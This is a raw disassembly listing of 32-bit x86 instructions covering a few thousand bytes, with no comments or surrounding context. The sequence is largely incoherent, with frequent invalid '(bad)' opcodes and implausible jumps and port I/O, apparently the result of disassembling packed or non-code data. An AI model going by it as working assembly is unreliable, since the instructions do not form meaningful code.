  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
